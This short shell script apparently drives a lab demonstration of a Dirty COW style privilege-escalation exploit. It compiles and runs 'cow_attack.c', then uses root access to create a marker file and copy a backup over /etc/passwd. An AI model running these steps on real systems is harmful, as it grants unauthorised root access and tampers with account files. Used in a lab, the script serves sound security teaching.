gcc -pthread cow_attack.c -o attack -lcrypt

./attack

echo "please type in twice: mypassword" 

 
su root -c "touch /success"
su root -c "cp /tmp/passwd.bak /etc/passwd"


ls / -hil
echo "please check the success file at /"

exit 0

